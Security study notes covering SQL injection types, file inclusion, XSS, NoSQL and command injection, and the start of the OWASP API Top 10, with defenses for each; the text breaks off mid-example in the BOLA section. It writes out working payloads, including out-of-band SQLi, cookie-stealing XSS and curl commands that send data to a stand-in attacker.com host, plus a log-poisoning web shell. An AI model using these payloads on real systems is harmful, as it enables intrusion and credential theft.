# 02-session_01B_T.md
# Injection Deep Dive — SQLi · File Inclusion · XSS · NoSQLi · CMDi
# + OWASP API Security Top 10 (2019 · 2023)

---

## 📑 Table of Contents

- [1. SQL Injection (SQLi)](#1-sql-injection-sqli)
  - [1.1 How SQL Injection Works](#11-how-sql-injection-works)
  - [1.2 Type 1 — Classic / In-Band SQLi](#12-type-1--classic--in-band-sqli)
  - [1.3 Type 2 — Union-Based SQLi](#13-type-2--union-based-sqli)
  - [1.4 Type 3 — Error-Based SQLi](#14-type-3--error-based-sqli)
  - [1.5 Type 4 — Boolean-Based Blind SQLi](#15-type-4--boolean-based-blind-sqli)
  - [1.6 Type 5 — Time-Based Blind SQLi](#16-type-5--time-based-blind-sqli)
  - [1.7 Type 6 — Out-of-Band (OOB) SQLi](#17-type-6--out-of-band-oob-sqli)
  - [1.8 Injection via Stored Procedures](#18-injection-via-stored-procedures)
  - [1.9 Second-Order SQLi](#19-second-order-sqli)
  - [1.10 SQLi Countermeasures](#110-sqli-countermeasures)
- [2. File Inclusion Vulnerabilities](#2-file-inclusion-vulnerabilities)
  - [2.1 Local File Inclusion (LFI)](#21-local-file-inclusion-lfi)
  - [2.2 Remote File Inclusion (RFI)](#22-remote-file-inclusion-rfi)
  - [2.3 LFI vs RFI Comparison](#23-lfi-vs-rfi-comparison)
  - [2.4 File Inclusion Countermeasures](#24-file-inclusion-countermeasures)
- [3. Cross-Site Scripting (XSS)](#3-cross-site-scripting-xss)
  - [3.1 Reflected XSS](#31-reflected-xss)
  - [3.2 Stored XSS](#32-stored-xss)
  - [3.3 DOM-Based XSS](#33-dom-based-xss)
  - [3.4 XSS Comparison Table](#34-xss-comparison-table)
  - [3.5 XSS Countermeasures](#35-xss-countermeasures)
- [4. NoSQL Injection](#4-nosql-injection)
- [5. Command Injection](#5-command-injection)
- [6. 📌 Extra Notes](#6--extra-notes)
  - [6.1 OWASP API Security Top 10 : 2023 — Full Coverage (API1–API10)](#61-owasp-api-security-top-10--2023--full-coverage-api1api10)
  - [6.2 OWASP API Security Top 10 : 2019 — Full List](#62-owasp-api-security-top-10--2019--full-list)
  - [6.3 API Security 2019 vs 2023 — Comparison Table](#63-api-security-2019-vs-2023--comparison-table)
  - [6.4 What's New, What Merged, What Was Removed (2019→2023)](#64-whats-new-what-merged-what-was-removed-20192023)
  - [6.5 BOLA vs IDOR — The Critical Distinction](#65-bola-vs-idor--the-critical-distinction)
  - [6.6 BOLA vs BFLA — The Other Key Distinction](#66-bola-vs-bfla--the-other-key-distinction)
  - [6.7 GraphQL Injection Attack Surface](#67-graphql-injection-attack-surface)
  - [6.8 SQLi Payload Deep Dive — All Types With Payloads](#68-sqli-payload-deep-dive--all-types-with-payloads)
  - [6.9 XSS Payload Patterns — Reflected · Stored · DOM](#69-xss-payload-patterns--reflected--stored--dom)
  - [6.10 Heartland Payment Systems Breach — Full Case Study](#610-heartland-payment-systems-breach--full-case-study)
  - [6.11 DVWA and WebGoat — Lab Context Reference](#611-dvwa-and-webgoat--lab-context-reference)
- [7. Abbreviations Table](#7-abbreviations-table)
- [8. Keywords + Concept Map](#8-keywords--concept-map)
- [9. Quick Reference Cheatsheet](#9-quick-reference-cheatsheet)
- [10. Session Revision Snapshot](#10-session-revision-snapshot)

---

## 1. SQL Injection (SQLi)

### 1.1 How SQL Injection Works

SQL Injection is the process of inserting or "injecting" a malicious SQL fragment into a query that an application sends to its database. When the application concatenates user input directly into a SQL string without sanitization or parameterization, the database interpreter executes the injected fragment as legitimate SQL code.

**Root cause:**
```
Vulnerable code (PHP):
$query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "'";
```
- The application treats user-controlled `$_GET['user']` as trusted SQL
- An attacker supplies: `' OR '1'='1`
- The query becomes: `SELECT * FROM users WHERE username = '' OR '1'='1'`
- The condition is always true → all records returned

**Three preconditions for SQLi:**
1. Application accepts user input
2. Input is incorporated into a SQL query (concatenated, not parameterized)
3. Error messages or response behavior reveals query results (for in-band) — or time/behavioral differences (for blind)

> [!IMPORTANT]
> SQLi maps to **A05:2025 Injection** in OWASP Top 10 2025. It has the **greatest number of CVEs** of all injection types. It was the #1 risk from 2003–2017.

---

### 1.2 Type 1 — Classic / In-Band SQLi

**Definition:** The attacker uses the **same communication channel** (the HTTP response) to both inject the payload and retrieve results. The most straightforward and commonly exploited type.

**Sub-types:**

| Sub-type | How it Works |
|---|---|
| **Error-based** | Deliberately triggers a SQL error — the database engine's error message contains data (covered separately below) |
| **Union-based** | Uses `UNION SELECT` to append a second query — results from both returned in same response |

**Classic exploitation flow:**
```
Step 1 — Find injectable parameter:
  URL: http://site.com/item?id=1
  Test: http://site.com/item?id=1'  → SQL error = injectable

Step 2 — Confirm injection:
  id=1 AND 1=1   → page loads normally
  id=1 AND 1=2   → page breaks / different response
  → Confirms SQL is being evaluated

Step 3 — Extract data (via UNION or error)
```

**Impact:** Full data extraction, authentication bypass, in some configurations — file read/write and OS command execution.

---

### 1.3 Type 2 — Union-Based SQLi

**Definition:** Uses the SQL `UNION` operator to append a second `SELECT` query to the original. The combined result set is returned in the HTTP response, exposing data from tables the attacker targets.

**Requirements:**
- The original query must return results visible in the HTTP response
- The injected `UNION SELECT` must have the **same number of columns** as the original query
- Column data types must be **compatible**

**Step-by-step exploitation:**
```sql
-- Step 1: Determine number of columns
' ORDER BY 1--    → no error
' ORDER BY 2--    → no error
' ORDER BY 3--    → error → original query has 2 columns

-- Step 2: Find which column is displayed
' UNION SELECT NULL, NULL--
' UNION SELECT 'a', NULL--   → 'a' appears in response → column 1 displayed

-- Step 3: Extract database version
' UNION SELECT version(), NULL--

-- Step 4: Extract table names
' UNION SELECT table_name, NULL FROM information_schema.tables--

-- Step 5: Extract column names
' UNION SELECT column_name, NULL FROM information_schema.columns
  WHERE table_name='users'--

-- Step 6: Extract data
' UNION SELECT username, password FROM users--
```

**Comment syntax by database:**

| Database | Comment Syntax |
|---|---|
| MySQL | `--` (with space) or `#` |
| MSSQL | `--` |
| Oracle | `--` |
| PostgreSQL | `--` |
| SQLite | `--` |

> [!NOTE]
> Oracle requires `FROM DUAL` in every SELECT — `' UNION SELECT NULL FROM DUAL--`. This is a common MCQ trap.

---

### 1.4 Type 3 — Error-Based SQLi

**Definition:** Deliberately causes the database to generate an error message that **contains data extracted from the database**. The error is returned in the HTTP response.

**How it works:**
The attacker uses database-specific functions that produce errors with embedded output. For example, in MySQL, `ExtractValue()` and `UpdateXML()` produce error messages containing their argument values:

```sql
-- MySQL: ExtractValue error-based
' AND ExtractValue(1, concat(0x7e, version()))--
-- Error returned: XPATH syntax error: '~8.0.28'
--                                        ↑ version leaked in error

-- MySQL: UpdateXML error-based
' AND UpdateXML(1, concat(0x7e, (SELECT user())), 1)--
-- Error: XPATH syntax error: '~root@localhost'

-- MSSQL: Convert error-based
' CONVERT(int, (SELECT TOP 1 username FROM users))--
-- Error: Conversion failed when converting the nvarchar value 'admin' to int
```

**Database-specific error-based functions:**

| Database | Function | Notes |
|---|---|---|
| MySQL | `ExtractValue()`, `UpdateXML()` | Most common for error-based |
| MSSQL | `CONVERT()`, `CAST()` | Type conversion errors leak data |
| Oracle | `UTL_INADDR.GET_HOST_ADDRESS()` | DNS-based data exfil |
| PostgreSQL | `CAST()` errors | Less common |

> [!NOTE]
> Error-based SQLi requires that **error messages are returned to the user** — if custom error pages are implemented (which they should be), error-based becomes blind.

---

### 1.5 Type 4 — Boolean-Based Blind SQLi

**Definition:** No data is returned directly in the HTTP response. The attacker infers data **one bit at a time** based on whether the application's response changes (page loads vs page doesn't load, true vs false behavior).

**How it works:**
```sql
-- Target: extract admin password character by character
-- True condition (page loads normally):
id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'

-- False condition (page shows different content):
id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='b'

-- Binary search approach:
id=1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>64
-- If true → first char ASCII > 64 → narrow down
-- Repeat until exact character is found

-- Full password extraction:
-- Character 1: Iterate ASCII values comparing response
-- Character 2: Move SUBSTRING offset to 2
-- Continue for each character
```

**Characteristics:**
- Very slow — requires hundreds to thousands of requests per character
- Automated by tools like SQLMap
- Works even when all data is hidden — only needs a binary (true/false) signal
- Signal can be: page content difference, HTTP status code, response length, redirect vs no redirect

---

### 1.6 Type 5 — Time-Based Blind SQLi

**Definition:** No visible response difference. The attacker infers data based on **how long the server takes to respond**. A deliberate time delay (SLEEP/WAITFOR) is injected as part of a conditional — if the condition is true, the delay occurs.

**How it works:**
```sql
-- MySQL: SLEEP()
id=1; IF(1=1, SLEEP(5), 0)--
-- If page takes ~5 seconds longer → injection confirmed

-- Extract data (time-based boolean):
id=1; IF(ASCII(SUBSTRING((SELECT password FROM users WHERE
  username='admin'),1,1))=97, SLEEP(5), 0)--
-- If 5-second delay occurs → first char is 'a' (ASCII 97)

-- MSSQL: WAITFOR DELAY
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL: pg_sleep()
'; SELECT pg_sleep(5)--

-- Oracle: dbms_pipe.receive_message()
'; SELECT dbms_pipe.receive_message(('a'),5) FROM DUAL--
```

**SLEEP/WAITFOR syntax by database:**

| Database | Time Delay Function |
|---|---|
| MySQL / MariaDB | `SLEEP(seconds)` |
| MSSQL | `WAITFOR DELAY 'hours:minutes:seconds'` |
| PostgreSQL | `pg_sleep(seconds)` |
| Oracle | `dbms_pipe.receive_message(('a'), seconds)` |
| SQLite | `randomblob(500000000/2)` (CPU exhaustion) |

> [!IMPORTANT]
> Time-based SQLi is used when **the application returns no visible difference** between true/false conditions — the only channel is response timing. Network latency can cause false positives — automated tools repeat requests to confirm.

---

### 1.7 Type 6 — Out-of-Band (OOB) SQLi

**Definition:** Data is exfiltrated through a **completely separate channel** — usually DNS lookup or HTTP request — rather than through the HTTP response. Used when the application has no visible output and time-based is unreliable.

**How it works:**
The attacker uses database features that can **make network requests** to an attacker-controlled server:

```sql
-- MySQL: LOAD_FILE + DNS (requires FILE privilege)
' UNION SELECT LOAD_FILE(concat('\\\\',(SELECT password FROM users
  WHERE username='admin'),'.attacker.com\\share'))--
-- Database resolves the DNS hostname → attacker's DNS server logs
-- the queried hostname = leaked password

-- MSSQL: xp_dirtree (via DNS/SMB)
'; EXEC master..xp_dirtree '\\attacker.com\share'--
-- SMB authentication attempt → NTLMv2 hash captured

-- Oracle: UTL_HTTP / UTL_FILE
'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||
  (SELECT password FROM users WHERE rownum=1)) FROM DUAL--
```

**OOB exfiltration channels:**
- DNS lookup (data encoded in subdomain)
- HTTP request to attacker-controlled server
- SMB UNC path (Windows — captures NTLM hashes)

**Requirements:**
- Database server must be able to make outbound network connections
- Attacker needs a listener/server to capture the OOB data
- In modern cloud environments, outbound connections are often restricted — making OOB less reliable

> [!NOTE]
> OOB SQLi is the most powerful technique when available because it's fast (asynchronous, not one-character-at-a-time like blind) and bypasses all HTTP-level filtering. Tools like **Burp Collaborator** are used specifically to capture OOB DNS/HTTP callbacks.

---

### 1.8 Injection via Stored Procedures

**Definition:** Stored procedures are pre-compiled SQL code blocks stored in the database. They are often assumed to be safe — but they can be vulnerable if they **concatenate** user input into dynamic SQL internally.

**Safe stored procedure (parameterized internally):**
```sql
CREATE PROCEDURE GetUser @username NVARCHAR(50)
AS
  SELECT * FROM users WHERE username = @username
GO
-- SAFE: @username is treated as data, never as SQL code
```

**Vulnerable stored procedure (dynamic SQL concatenation):**
```sql
CREATE PROCEDURE GetUser @username NVARCHAR(50)
AS
  DECLARE @sql NVARCHAR(500)
  SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
  EXEC(@sql)
GO
-- VULNERABLE: @username is concatenated into SQL string
-- Injection: @username = "' OR '1'='1"
```

**MSSQL dangerous stored procedures:**

| Procedure | Risk |
|---|---|
| `xp_cmdshell` | Executes OS shell commands — if enabled, SQL → OS command execution |
| `xp_dirtree` | Lists directory contents — can be used for OOB via SMB |
| `sp_oacreate` | Creates COM objects — potential for RCE |

> [!WARNING]
> `xp_cmdshell` is disabled by default in modern MSSQL but can be re-enabled if the attacker gains `sysadmin` privilege via SQL injection. This escalates SQL injection directly to OS command execution.

---

### 1.9 Second-Order SQLi

**Definition:** The attacker stores a malicious payload in the database via one request (which is properly escaped). The payload is later **retrieved from the database and unsafely reused** in another query — where it fires.

```
Step 1 — Register username: admin'--
  App correctly escapes: INSERT INTO users VALUES ('admin''--', ...)
  Stored in DB as: admin'--

Step 2 — Password change feature:
  App retrieves username from DB (trusted source) and builds:
  UPDATE users SET password='newpass' WHERE username='admin'--'
  → The -- comments out the rest → changes admin's password, not the
    attacker's
```

> [!NOTE]
> Second-order SQLi is dangerous precisely because it bypasses **input sanitization at entry**. The sanitization happens on the way in, but the dangerous execution happens on the way out. It requires understanding the full data flow, not just the injection point.

---

### 1.10 SQLi Countermeasures

| Defense | Mechanism | Effectiveness |
|---|---|---|
| **Parameterized Queries / Prepared Statements** | Query structure fixed; input always treated as data | ✅ Primary defense — defeats all SQLi types |
| **Stored Procedures (correctly parameterized)** | Pre-compiled query structure; input bound as parameter | ✅ Effective if no dynamic SQL inside |
| **ORM Frameworks** | Hibernate, SQLAlchemy, Entity Framework — parameterize by default | ✅ Reduces developer error |
| **Input Validation (allowlist)** | Accept only known-good characters (digits for IDs, etc.) | ✅ Defense-in-depth |
| **Escaping** | Escape special characters when parameterization impossible | ⚠️ Fragile — context-dependent, error-prone |
| **Least Privilege on DB Account** | App DB user has only SELECT/INSERT — no DROP, EXEC, xp_cmdshell | ✅ Limits blast radius |
| **Disable xp_cmdshell** | Removes direct OS command execution from MSSQL | ✅ Reduces escalation path |
| **WAF (Web Application Firewall)** | Detects/blocks common SQLi patterns | ⚠️ Bypassable — not a substitute for parameterization |
| **Error Handling** | Never return database error messages to users | ✅ Prevents error-based and fingerprinting |
| **SAST/DAST Scanning** | Automated detection of injectable code in CI/CD | ✅ Catches issues before production |

> [!IMPORTANT]
> The only **complete** defense against all six types of SQLi is **parameterized queries / prepared statements**. Every other defense is defense-in-depth — valuable, but not a replacement.

---

## 2. File Inclusion Vulnerabilities

### 2.1 Local File Inclusion (LFI)

**Definition:** LFI occurs when an application uses user-controlled input to include a file from the **local filesystem** without proper validation. An attacker manipulates the path to read sensitive files or, in advanced cases, achieve code execution.

**How it works:**

```php
// Vulnerable PHP code:
$page = $_GET['page'];
include($page . '.php');

// Normal use: ?page=about → includes about.php
// Attack:     ?page=../../../../etc/passwd
//             → includes /etc/passwd (path traversal)
```

**Common LFI target files (Linux):**

| File | Contents |
|---|---|
| `/etc/passwd` | User accounts (usernames, UIDs, home dirs) |
| `/etc/shadow` | Hashed passwords (requires root) |
| `/etc/hosts` | Hostname-to-IP mappings |
| `/proc/self/environ` | Environment variables (may include HTTP headers) |
| `/proc/self/cmdline` | Command line of running process |
| `/var/log/apache2/access.log` | Apache access log (used for log poisoning) |
| `~/.ssh/id_rsa` | SSH private key if home dir known |
| `/etc/nginx/nginx.conf` | Nginx config — reveals server structure |

**Common LFI target files (Windows):**

| File | Contents |
|---|---|
| `C:\Windows\win.ini` | Old Windows config — used to confirm LFI |
| `C:\Windows\System32\drivers\etc\hosts` | Windows hosts file |
| `C:\inetpub\logs\LogFiles\` | IIS logs |
| `C:\Windows\System32\config\SAM` | SAM database (credentials) |

**Path traversal bypass techniques:**

| Bypass | Technique |
|---|---|
| Null byte (PHP < 5.3.4) | `../../../../etc/passwd%00` — null byte terminates string, strips `.php` extension |
| Double encoding | `..%252f..%252f` → `../../` after double decode |
| Path normalization bypass | `....//....//etc/passwd` — some filters strip `../` leaving `../../` |
| Absolute path | `/etc/passwd` — if `include()` accepts absolute paths |

**LFI → RCE (Log Poisoning):**
```
Step 1: Inject PHP code into Apache access log via User-Agent:
  User-Agent: <?php system($_GET['cmd']); ?>

Step 2: Include the log file via LFI:
  ?page=../../../../var/log/apache2/access.log&cmd=id

Step 3: Apache log contains the User-Agent → PHP executes it
→ Output of `id` command returned
```

> [!NOTE]
> Log poisoning is the classic technique to escalate LFI to RCE. Other escalation paths include: PHP session file inclusion (`/tmp/sess_SESSIONID`), `/proc/self/fd/X` (file descriptor), and including uploaded files.

---

### 2.2 Remote File Inclusion (RFI)

**Definition:** RFI occurs when the application can be tricked into **including a file from a remote URL** controlled by the attacker. The remote file is fetched and executed on the server — this is almost always direct RCE.

**How it works:**

```php
// Vulnerable PHP code (allow_url_include = On):
include($_GET['page'] . '.php');

// Attack:
?page=http://attacker.com/shell
// Server fetches http://attacker.com/shell.php
// Executes attacker's PHP code on the target server
```

**PHP configuration required for RFI:**
- `allow_url_include = On` (disabled by default since PHP 5.2)
- `allow_url_fopen = On` (enabled by default but needed for some vectors)

> [!IMPORTANT]
> RFI requires `allow_url_include = On` which is **OFF by default** in modern PHP. This is why RFI is less common than LFI in modern apps. When found, RFI almost always results in immediate RCE — it's a critical severity finding.

---

### 2.3 LFI vs RFI Comparison

| Property | LFI | RFI |
|---|---|---|
| **File source** | Local server filesystem | Remote attacker-controlled URL |
| **PHP setting required** | None (default behavior) | `allow_url_include = On` |
| **Default exploitability** | ✅ More common | ❌ Requires misconfiguration |
| **Direct RCE** | ❌ Requires chaining (log poisoning etc.) | ✅ Almost always immediate RCE |
| **Severity** | High (info disclosure; escalatable to RCE) | Critical (direct RCE) |
| **Example payload** | `../../../../etc/passwd` | `http://attacker.com/shell` |
| **Primary risk** | Sensitive file read → credential theft | Remote code execution |

---

### 2.4 File Inclusion Countermeasures

- **Never pass user input directly to `include()`, `require()`, `fopen()`**
- Use an allowlist of permitted filenames — map user input to filenames internally:
  ```php
  $allowed = ['home' => 'home.php', 'about' => 'about.php'];
  $page = $allowed[$_GET['page']] ?? 'home.php';
  include($page);
  ```
- Disable `allow_url_include` in `php.ini` (should be Off by default)
- Implement `open_basedir` restriction — confines PHP file access to a specific directory
- Strip or reject path traversal sequences (`../`, `..\\`, `%2e%2e`)
- Use absolute paths with whitelisted directory prefixes
- DAST scanning for path traversal patterns

---

## 3. Cross-Site Scripting (XSS)

**Definition:** XSS occurs when an application includes **untrusted data in a web page without proper output encoding**, allowing attackers to inject client-side scripts (usually JavaScript) that execute in the victim's browser. XSS is merged into **A05:2025 Injection** — it was last standalone as **A7:2017**.

**Core principle:** XSS = injection into an **output context** (HTML, JavaScript, CSS, URL). The browser is the interpreter — it executes the injected script as if it were legitimate page code.

**Impact of XSS:**
- Session hijacking (steal `document.cookie`)
- Account takeover
- Keylogging
- Credential harvesting (phishing overlay)
- Browser exploitation (BeEF framework)
- Redirecting to malware sites
- Defacement

---

### 3.1 Reflected XSS

**Definition:** The malicious payload is **embedded in the HTTP request** (URL parameter, form input) and immediately "reflected" back in the HTTP response without being stored. The victim must click a crafted link to trigger it.

**How it works:**
```
Attacker crafts URL:
https://site.com/search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

Victim clicks link → server reflects input back into response:
<html>
  You searched for: <script>document.location='http://attacker.com/steal?c='+document.cookie</script>
</html>

Browser executes script → cookies sent to attacker.com
```

**Characteristics:**
- **Not persistent** — payload not stored; only the person who clicks the crafted link is affected
- **Delivered via** phishing emails, malicious links, shortened URLs, HTTP redirect chains
- **Single-victim** — attacker must trick each victim individually
- **Easiest to detect** in application testing (payload in request = payload in response)

**Context matters:**
```html
<!-- HTML context injection -->
<p>Search results for: <INJECTION></p>
Payload: <script>alert(1)</script>

<!-- Attribute context injection (quotes may be filtered) -->
<input value="<INJECTION>">
Payload: "><script>alert(1)</script>

<!-- JavaScript context injection (no tags needed) -->
<script>var q = '<INJECTION>'</script>
Payload: '; alert(1); //
```

---

### 3.2 Stored XSS

**Definition:** The malicious payload is **saved (stored) on the server** — in a database, comment field, user profile, log, etc. The payload executes in the browser of **every user who views the affected page**. No crafted link needed — the attacker injects once and affects all subsequent viewers.

**How it works:**
```
Attacker posts comment on a forum:
  Name: Hacker
  Comment: Nice post! <script>document.location='http://attacker.com/steal?c='+document.cookie</script>

Comment saved to database.

Every user who loads the page with that comment →
  Browser renders the comment → executes the script →
  Their session cookie sent to attacker's server
```

**Characteristics:**
- **Persistent** — stored in the application; fires for every viewer
- **Higher impact** — one injection can compromise many users simultaneously
- **Harder to detect** — payload not in request, in stored data
- **Common locations:** comments, user profiles, forum posts, product reviews, chat messages, log viewers

**Blind Stored XSS:**
A variant where the payload stores in a location only **admins see** — e.g., a support ticket system. The attacker submits a ticket with XSS payload. When the admin views it in the admin panel, the script executes in the admin's browser — privileged session cookie captured. Tool: **XSS Hunter** (captures out-of-band XSS firing).

---

### 3.3 DOM-Based XSS

**Definition:** The vulnerability exists entirely in the **client-side JavaScript code**. The server never sees the malicious payload — the attack occurs when JavaScript on the page reads attacker-controlled data (from URL hash, `document.URL`, `localStorage`, etc.) and writes it to the DOM unsafely.

**How it works:**
```javascript
// Vulnerable client-side JavaScript:
document.getElementById('greeting').innerHTML = 
  "Welcome " + document.location.hash.substring(1);

// URL: https://site.com/page#<img src=x onerror=alert(1)>
// The hash fragment is never sent to the server
// Browser's JS reads it and writes it to innerHTML → XSS fires
```

**Source → Sink model:**

| Term | Definition | Examples |
|---|---|---|
| **Source** | Where attacker-controlled input enters the JavaScript | `location.hash`, `location.search`, `document.URL`, `document.referrer`, `localStorage`, `postMessage` |
| **Sink** | Where the data is written in a dangerous way | `innerHTML`, `document.write()`, `eval()`, `setTimeout(string)`, `location.href`, `src` attribute |

**Common DOM XSS sinks:**
```javascript
// DANGEROUS sinks:
element.innerHTML = userInput           // Parses HTML → executes scripts
element.outerHTML = userInput
document.write(userInput)
eval(userInput)                         // Executes as JavaScript
setTimeout(userInput, 100)             // String form = eval
location.href = userInput              // javascript: URL
jQuery(userInput)                      // jQuery parsing
$('#div').html(userInput)              // jQuery innerHTML

// SAFE alternatives:
element.textContent = userInput        // Plain text — no HTML parsing
element.innerText = userInput          // Plain text
```

**Characteristics:**
- **Server never sees the payload** — WAFs and server-side filters are blind to DOM XSS
- **Harder to detect** — requires JavaScript code review, not just HTTP traffic analysis
- **Common in SPAs** (Single Page Applications) that do heavy client-side rendering

---

### 3.4 XSS Comparison Table

| Property | Reflected | Stored | DOM-Based |
|---|---|---|---|
| **Storage** | Not stored — in request/response | Stored in server (DB, logs) | Not stored — client-side only |
| **Server involvement** | Server reflects payload in response | Server stores and serves payload | Server not involved in execution |
| **Victims** | Only users who click crafted link | All users who view the affected page | Users who visit a crafted URL |
| **Persistence** | ❌ Not persistent | ✅ Persistent | ❌ Not persistent |
| **WAF detection** | ✅ Easier — payload in HTTP response | ✅ Detectable on submission | ❌ Hardest — payload never in server traffic |
| **Impact scope** | Low–Medium (single victim) | High (all viewers) | Medium (URL-based) |
| **Common vector** | Phishing emails with crafted URLs | Comment fields, user profiles | Hash fragments, URL params in JS |
| **OWASP Category** | A05:2025 Injection | A05:2025 Injection | A05:2025 Injection |
| **Old OWASP Category** | A7:2017 (standalone) | A7:2017 (standalone) | A7:2017 (standalone) |

---

### 3.5 XSS Countermeasures

| Defense | Applies To | Details |
|---|---|---|
| **Output Encoding** | All types | HTML-encode output: `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;` — context-specific encoding required |
| **Content Security Policy (CSP)** | All types | `Content-Security-Policy: default-src 'self'; script-src 'self'` — blocks inline scripts and external sources |
| **HttpOnly Cookie Flag** | Session hijacking | Prevents `document.cookie` access from JavaScript — mitigates impact of XSS |
| **Secure Cookie Flag** | Session hijacking | Ensures cookie only sent over HTTPS — prevents network sniffing of hijacked cookie |
| **SameSite Cookie Flag** | CSRF + XSS chaining | `SameSite=Strict` or `Lax` limits cross-origin cookie sending |
| **Input Validation** | All types | Allowlist expected input — reject unexpected characters |
| **DOMPurify** | DOM-based | Client-side HTML sanitization library — sanitizes before inserting to DOM |
| **Avoid dangerous sinks** | DOM-based | Use `textContent` instead of `innerHTML`; avoid `eval()` |
| **X-XSS-Protection header** | Reflected | `X-XSS-Protection: 1; mode=block` — legacy browser XSS filter (deprecated in modern browsers — CSP is the replacement) |
| **Trusted Types API** | DOM-based | Browser API enforcing safe DOM manipulation — modern Chrome support |

> [!IMPORTANT]
> **Output encoding is context-dependent.** HTML encoding is correct for HTML body context. JavaScript encoding is correct for JS string context. URL encoding for URL context. CSS encoding for style context. Using the wrong encoding type for the context provides no protection.

---

## 4. NoSQL Injection

**Definition:** NoSQL injection exploits vulnerable query construction in **NoSQL databases** (MongoDB, Redis, Cassandra, CouchDB). Instead of SQL syntax, attackers inject **query operators or JavaScript** to manipulate database logic.

**Target database:** Most commonly **MongoDB** (document-based, uses JSON/BSON queries).

**How it works (MongoDB):**

```javascript
// Vulnerable Node.js code:
db.users.find({username: req.body.username, password: req.body.password});

// Normal input:
username = "admin", password = "secret"
// Query: db.users.find({username: "admin", password: "secret"})

// NoSQL injection using MongoDB operators:
username = "admin"
password = { "$ne": "" }   // $ne = "not equal"
// Query: db.users.find({username: "admin", password: {$ne: ""}})
// Condition: password is not equal to "" → ALWAYS TRUE → authentication bypassed
```

**MongoDB operator injection payloads:**

| Operator | Meaning | Injection Effect |
|---|---|---|
| `$ne` | Not equal | `{password: {$ne: ""}}` — always true |
| `$gt` | Greater than | `{age: {$gt: 0}}` — match all records |
| `$regex` | Regular expression | `{username: {$regex: "ad.*"}}` — enumerate users |
| `$where` | JavaScript expression | `{$where: "this.password.length > 0"}` — JS eval |
| `$exists` | Field exists | `{admin: {$exists: true}}` — find admin fields |

**JSON POST body injection:**
```http
POST /login HTTP/1.1
Content-Type: application/json

{"username": "admin", "password": {"$ne": ""}}
```

**URL parameter injection:**
```
GET /users?username[$ne]=&password[$ne]=
```

**JavaScript injection via `$where`:**
```javascript
{$where: "sleep(5000)"}  // Time-based blind NoSQLi
{$where: "this.username == 'admin'"}  // Data extraction
```

> [!NOTE]
> MongoDB's `$where` operator accepts a JavaScript expression — this enables time-based blind NoSQLi and more complex data extraction. Newer MongoDB versions limit `$where` usage. Best defense: **disable `$where`** and use parameterized queries via a MongoDB ODM like Mongoose.

**Countermeasures:**
- Use ODM (Object Document Mapper) — Mongoose for MongoDB — enforces schema types
- Validate and sanitize input types — reject objects where strings are expected
- Disable `$where` and JavaScript execution in MongoDB config
- Use allowlist validation on query parameters
- Principle of least privilege on database accounts

---

## 5. Command Injection

**Definition:** Command injection occurs when an application passes **unsafe user-controlled data to a system shell**. The attacker injects additional OS commands that execute with the same privileges as the application process.

**How it works:**

```python
# Vulnerable Python code:
import os
user_input = request.args.get('host')
output = os.system("ping -c 1 " + user_input)

# Normal: host=google.com → executes: ping -c 1 google.com
# Injected: host=google.com; id
# Executes: ping -c 1 google.com; id
# Output of 'id' command returned — RCE confirmed
```

**Shell metacharacters used for injection:**

| Metacharacter | Meaning | Example |
|---|---|---|
| `;` | Execute next command unconditionally | `host; id` |
| `&&` | Execute next command if previous succeeded | `host && id` |
| `\|\|` | Execute next command if previous failed | `badhost \|\| id` |
| `\|` | Pipe — pass output to next command | `host \| id` |
| `` ` `` | Command substitution (backtick) | `` host`id` `` |
| `$(...)` | Command substitution (dollar-paren) | `host$(id)` |
| `\n` / `%0a` | Newline — separate commands | `host%0aid` |
| `&` | Background execution | `host & id` |

**Blind Command Injection:**
When there's no output visible in the response:
```bash
# Time-based:
host=google.com; sleep 5

# OOB via DNS:
host=google.com; nslookup $(id).attacker.com

# OOB via HTTP:
host=google.com; curl http://attacker.com/$(id)
```

**Real-World Example — Shellshock (CVE-2014-6271):**
```bash
# Vulnerable bash processes environment variables as functions:
env x='() { :;}; echo vulnerable' bash -c "echo test"
# The function definition () { :;} is parsed, then the command after ;; executes
# Attack via HTTP User-Agent header passed to CGI scripts
```

**Countermeasures:**
- **Never pass user input to shell commands** — redesign to use library functions instead:
  ```python
  # Instead of: os.system("ping " + host)
  # Use:
  import subprocess
  result = subprocess.run(['ping', '-c', '1', host], capture_output=True)
  # List form → no shell interpolation → user input treated as literal argument
  ```
- If system calls unavoidable — use `subprocess.run(args_list)` (not `shell=True`) in Python
- Allowlist valid characters for input (IP addresses: digits and dots only)
- Escape shell metacharacters using language-provided escaping functions
- Principle of least privilege — application runs as low-privilege OS user
- WAF rules for shell metacharacters

> [!IMPORTANT]
> The key difference between **SQL injection** (interpreter: database) and **command injection** (interpreter: OS shell) is the **interpreter being exploited**. Both are classified under **A05:2025 Injection** in OWASP 2025.

---

## 6. 📌 Extra Notes

---

### 6.1 OWASP API Security Top 10 : 2023 — Full Coverage (API1–API10)

> [!NOTE]
> The OWASP API Security Top 10 is a **separate project** from the OWASP Web Application Top 10. It was first published in **2019** and updated in **2023**. Both versions are exam-relevant. The API Security project specifically addresses risks that manifest uniquely in API contexts — not covered adequately by the web app Top 10.

<!--citation:5-->The official 2023 list is: API1:2023 Broken Object Level Authorization · API2:2023 Broken Authentication · API3:2023 Broken Object Property Level Authorization · API4:2023 Unrestricted Resource Consumption · API5:2023 Broken Function Level Authorization · API6:2023 Unrestricted Access to Sensitive Business Flows · API7:2023 Server Side Request Forgery · API8:2023 Security Misconfiguration · API9:2023 Improper Inventory Management · API10:2023 Unsafe Consumption of APIs.

---

#### API1:2023 — Broken Object Level Authorization (BOLA)

**Position:** #1 (same as API1:2019 — unchanged)

**What it is:**
APIs expose endpoints that handle object identifiers (user IDs, record IDs, UUIDs). When the server does **not verify that the requesting user is authorized to access the specific object**, an attacker can manipulate the identifier to access another user's data.

<!--citation:7-->Broken object level authorization stems from a lack of proper access controls on API endpoints allowing unauthorized users to access and modify sensitive data. BOLA is represented in about 40% of all API attacks and has been number one on the OWASP list since 2019.

**Attack pattern:**
```http
# Attacker's legitimate request:
GET /api/v1/users/12345/profile
Authorization: Bearer attacker_token
